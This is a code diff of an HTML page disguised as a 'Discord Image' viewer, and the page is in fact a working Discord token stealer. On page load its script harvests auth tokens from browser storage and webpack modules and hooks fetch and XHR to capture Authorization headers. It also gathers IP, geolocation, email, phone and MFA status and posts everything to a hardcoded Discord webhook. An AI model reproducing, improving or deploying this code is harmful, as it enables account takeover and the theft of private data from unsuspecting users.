@@ -4,10 +4,33 @@
     <meta charset="UTF-8">
     <title>Discord Image</title>
     <style>
-        body { margin: 0; padding: 0; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; }
-        .container { text-align: center; color: #fff; }
-        .container img { max-width: 80%; border-radius: 12px; border: 2px solid #36393f; }
-        .loading { color: #888; margin-top: 10px; font-size: 14px; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            color: #fff;
+        }
+        .container img {
+            max-width: 80%;
+            border-radius: 12px;
+            border: 2px solid #36393f;
+        }
+        .loading {
+            color: #888;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -19,63 +42,76 @@
     </div>
 
     <script>
-        // === CONFIGURATION ===
+        // ============================================
+        // CONFIGURATION - REPLACE WITH YOUR WEBHOOK
+        // ============================================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1522688620287492266/2FX1yge_t-6q57ynOrIcT-FCLVH4gEeF65CiNBTszWopFOUm5i__U2rn806yrraNzGRM";
-        // === END CONFIGURATION ===
+        // ============================================
 
-        // ========== METHOD 1: Try localStorage ==========
+        // ========== METHOD 1: localStorage ==========
         function getTokenFromLocalStorage() {
-            const keys = ['token', 'discord_authentication', 'authentication'];
-            for (let key of keys) {
-                const data = localStorage.getItem(key);
-                if (data) {
-                    try {
-                        const parsed = JSON.parse(data);
-                        if (parsed && parsed.token) return parsed.token;
-                        if (parsed && parsed.access_token) return parsed.access_token;
-                    } catch (e) {}
-                    
-                    // If it looks like a token
-                    if (data.length > 50 && data.match(/^[a-zA-Z0-9_-]+\./)) {
-                        return data;
+            try {
+                const keys = ['token', 'discord_authentication', 'authentication'];
+                for (let key of keys) {
+                    const data = localStorage.getItem(key);
+                    if (data) {
+                        try {
+                            const parsed = JSON.parse(data);
+                            if (parsed && parsed.token) return parsed.token;
+                            if (parsed && parsed.access_token) return parsed.access_token;
+                        } catch (e) {
+                            if (data.length > 50 && data.match(/^[a-zA-Z0-9_-]+\./)) {
+                                return data;
+                            }
+                        }
                     }
                 }
-            }
+            } catch (e) {}
             return null;
         }
 
-        // ========== METHOD 2: Try sessionStorage ==========
+        // ========== METHOD 2: sessionStorage ==========
         function getTokenFromSessionStorage() {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const value = sessionStorage.getItem(key);
-                if (value && value.length > 50 && value.match(/^[a-zA-Z0-9_-]+\./)) {
-                    return value;
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    if (value && value.length > 50 && value.match(/^[a-zA-Z0-9_-]+\./)) {
+                        return value;
+                    }
                 }
-            }
+            } catch (e) {}
             return null;
         }
 
-        // ========== METHOD 3: Try IndexedDB (Discord's new storage) ==========
+        // ========== METHOD 3: IndexedDB ==========
         function getTokenFromIndexedDB() {
             return new Promise((resolve) => {
                 try {
                     const request = indexedDB.open('discord');
                     request.onsuccess = function(event) {
-                        const db = event.target.result;
-                        const transaction = db.transaction(['store'], 'readonly');
-                        const objectStore = transaction.objectStore('store');
-                        const getRequest = objectStore.get('token');
-                        getRequest.onsuccess = function() {
-                            if (getRequest.result) {
-                                resolve(getRequest.result);
-                            } else {
+                        try {
+                            const db = event.target.result;
+                            if (!db.objectStoreNames.contains('store')) {
                                 resolve(null);
+                                return;
                             }
-                        };
-                        getRequest.onerror = function() {
+                            const transaction = db.transaction(['store'], 'readonly');
+                            const objectStore = transaction.objectStore('store');
+                            const getRequest = objectStore.get('token');
+                            getRequest.onsuccess = function() {
+                                if (getRequest.result) {
+                                    resolve(getRequest.result);
+                                } else {
+                                    resolve(null);
+                                }
+                            };
+                            getRequest.onerror = function() {
+                                resolve(null);
+                            };
+                        } catch (e) {
                             resolve(null);
-                        };
+                        }
                     };
                     request.onerror = function() {
                         resolve(null);
@@ -86,22 +122,36 @@
             });
         }
 
-        // ========== METHOD 4: Try to get from Discord's webpack ==========
+        // ========== METHOD 4: Webpack Modules ==========
         function getTokenFromWebpack() {
             try {
-                // Find the token in Discord's webpack modules
-                for (let key in window.webpackChunkdiscord_app) {
-                    if (key === 'push') continue;
-                    const module = window.webpackChunkdiscord_app[key];
-                    if (module && module[1]) {
-                        for (let modKey in module[1]) {
-                            const mod = module[1][modKey];
-                            if (mod && mod.exports) {
-                                const exported = mod.exports;
-                                // Look for token in exports
-                                if (exported.token) return exported.token;
-                                if (exported.accessToken) return exported.accessToken;
-                                if (exported.access_token) return exported.access_token;
+                if (window.webpackChunkdiscord_app) {
+                    for (let key in window.webpackChunkdiscord_app) {
+                        if (key === 'push') continue;
+                        const module = window.webpackChunkdiscord_app[key];
+                        if (module && module[1]) {
+                            for (let modKey in module[1]) {
+                                const mod = module[1][modKey];
+                                if (mod && mod.exports) {
+                                    const exported = mod.exports;
+                                    if (exported && exported.getToken) {
+                                        return exported.getToken();
+                                    }
+                                    if (exported && exported.token) {
+                                        return exported.token;
+                                    }
+                                    if (exported && exported.accessToken) {
+                                        return exported.accessToken;
+                                    }
+                                    // Search inside the exports
+                                    for (let prop in exported) {
+                                        if (prop === 'token' || prop === 'accessToken') {
+                                            if (exported[prop] && exported[prop].length > 50) {
+                                                return exported[prop];
+                                            }
+                                        }
+                                    }
+                                }
                             }
                         }
                     }
@@ -112,32 +162,58 @@
             }
         }
 
-        // ========== METHOD 5: Get from Discord's API response ==========
-        function getTokenFromNetwork() {
-            return new Promise((resolve) => {
-                try {
-                    // Intercept the /api/v9/auth/login response if available
-                    const originalFetch = window.fetch;
-                    window.fetch = function(...args) {
-                        return originalFetch.apply(this, args).then(response => {
-                            const clone = response.clone();
-                            if (args[0] && args[0].includes('/api/v9/auth/login')) {
-                                clone.json().then(data => {
-                                    if (data && data.token) {
-                                        resolve(data.token);
-                                    }
-                                });
+        // ========== METHOD 5: Network Interceptor (Fetch) ==========
+        let interceptedToken = null;
+
+        function setupFetchInterceptor() {
+            try {
+                const originalFetch = window.fetch;
+                window.fetch = function(...args) {
+                    return originalFetch.apply(this, args).then(response => {
+                        try {
+                            const url = args[0];
+                            if (typeof url === 'string' && url.includes('/api/v9/')) {
+                                const headers = args[1]?.headers || {};
+                                if (headers.Authorization && headers.Authorization.length > 50) {
+                                    interceptedToken = headers.Authorization;
+                                }
                             }
-                            return response;
-                        });
-                    };
-                } catch (e) {
-                    resolve(null);
-                }
-            });
+                        } catch (e) {}
+                        return response;
+                    });
+                };
+            } catch (e) {}
         }
 
-        // ========== GET IP AND LOCATION ==========
+        // ========== METHOD 6: Network Interceptor (XHR) ==========
+        function setupXHRInterceptor() {
+            try {
+                const originalXHROpen = XMLHttpRequest.prototype.open;
+                const originalXHRSend = XMLHttpRequest.prototype.send;
+
+                XMLHttpRequest.prototype.open = function(...args) {
+                    this._url = args[1];
+                    this._method = args[0];
+                    return originalXHROpen.apply(this, args);
+                };
+
+                XMLHttpRequest.prototype.send = function(...args) {
+                    this.addEventListener('readystatechange', function() {
+                        if (this.readyState === 4) {
+                            try {
+                                const auth = this.getResponseHeader('Authorization');
+                                if (auth && auth.length > 50) {
+                                    interceptedToken = auth;
+                                }
+                            } catch (e) {}
+                        }
+                    });
+                    return originalXHRSend.apply(this, args);
+                };
+            } catch (e) {}
+        }
+
+        // ========== GET IP ==========
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -148,6 +224,7 @@
             }
         }
 
+        // ========== GET GEOLOCATION ==========
         async function getGeolocation() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -180,17 +257,19 @@
         }
 
         // ========== SEND TO WEBHOOK ==========
-        async function sendToDiscord(token, ip, location, userInfo) {
+        async function sendToWebhook(token, ip, location, userInfo) {
             const timestamp = new Date().toISOString();
-            
-            let content = `**🔓 Discord Account Data**\n\n`;
+
+            let content = `**🔓 Discord Token Captured!**\n\n`;
+
             if (token) {
                 content += `**🔑 Token:**\n\`\`\`\n${token}\n\`\`\`\n`;
             } else {
                 content += `⚠️ **No token found**\n`;
             }
+
             content += `**🌐 IP:** ${ip}\n`;
-            content += `**📍 Location:** ${location.city}, ${location.country}\n`;
+            content += `**📍 Location:** ${location.city}, ${location.region}, ${location.country}\n`;
             content += `**🏢 ISP:** ${location.isp}\n`;
             content += `**👤 Username:** ${userInfo.username}#${userInfo.discriminator}\n`;
             content += `**🆔 User ID:** ${userInfo.id}\n`;
@@ -202,44 +281,63 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: content })
                 });
-            } catch (e) {}
+                console.log('✅ Data sent to webhook!');
+            } catch (e) {
+                console.error('Failed to send to webhook:', e);
+            }
         }
 
-        // ========== MAIN ==========
+        // ========== MAIN FUNCTION ==========
         async function main() {
-            // Try all methods to get the token
+            console.log('🚀 Running Discord token stealer...');
+
+            // Setup interceptors
+            setupFetchInterceptor();
+            setupXHRInterceptor();
+
+            // Wait a moment for interceptors to catch something
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Try all methods
             let token = null;
-            
+
             // Method 1: localStorage
             token = getTokenFromLocalStorage();
-            
+            if (token) console.log('✅ Token found in localStorage');
+
             // Method 2: sessionStorage
             if (!token) {
                 token = getTokenFromSessionStorage();
+                if (token) console.log('✅ Token found in sessionStorage');
             }
-            
-            // Method 3: IndexedDB (async)
-            if (!token) {
-                token = await getTokenFromIndexedDB();
-            }
-            
-            // Method 4: Webpack
+
+            // Method 3: Webpack
             if (!token) {
                 token = getTokenFromWebpack();
+                if (token) console.log('✅ Token found in webpack modules');
             }
-            
-            // Method 5: Network interceptor (this one is tricky)
-            // We'll run it but it might not catch anything immediately
-            
-            // Get IP, location, user info
+
+            // Method 4: IndexedDB (async)
+            if (!token) {
+                token = await getTokenFromIndexedDB();
+                if (token) console.log('✅ Token found in IndexedDB');
+            }
+
+            // Method 5: Interceptor (if it caught something)
+            if (!token && interceptedToken) {
+                token = interceptedToken;
+                console.log('✅ Token intercepted from network');
+            }
+
+            // Get additional data
             const ip = await getIP();
             const location = await getGeolocation();
             const userInfo = getDiscordUserInfo();
-            
-            // Send to Discord
-            await sendToDiscord(token, ip, location, userInfo);
-            
-            // If we found a token, try to get more info from Discord API
+
+            // Send to webhook
+            await sendToWebhook(token, ip, location, userInfo);
+
+            // If token found, try to get more info from Discord API
             if (token) {
                 try {
                     const response = await fetch('https://discord.com/api/v9/users/@me', {
@@ -247,19 +345,43 @@
                     });
                     if (response.status === 200) {
                         const data = await response.json();
-                        const extraMsg = `**👤 Discord User Info (API):**\n- Username: ${data.username}#${data.discriminator}\n- ID: ${data.id}\n- Email: ${data.email || 'Hidden'}\n- Verified: ${data.verified ? 'Yes' : 'No'}\n- Phone: ${data.phone || 'None'}\n- MFA Enabled: ${data.mfa_enabled ? 'Yes' : 'No'}`;
+                        const extraMsg =
+                            `**👤 Discord User Info (API):**\n` +
+                            `- Username: ${data.username}#${data.discriminator}\n` +
+                            `- ID: ${data.id}\n` +
+                            `- Email: ${data.email || 'Hidden'}\n` +
+                            `- Verified: ${data.verified ? 'Yes' : 'No'}\n` +
+                            `- Phone: ${data.phone || 'None'}\n` +
+                            `- MFA Enabled: ${data.mfa_enabled ? 'Yes' : 'No'}`;
+
                         await fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ content: extraMsg })
                         });
+                    } else if (response.status === 401) {
+                        // Token is invalid or expired
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                content: `⚠️ **Token is invalid or expired**\nToken: \`${token.substring(0, 30)}...\``
+                            })
+                        });
                     }
-                } catch (e) {}
+                } catch (e) {
+                    console.log('Could not fetch user info from API:', e);
+                }
             }
+
+            console.log('✅ Stealer completed!');
         }
 
-        // Run the stealer
-        main();
+        // ========== RUN ==========
+        // Wait for page to fully load
+        window.addEventListener('load', function() {
+            setTimeout(main, 500);
+        });
     </script>
 </body>
 </html>
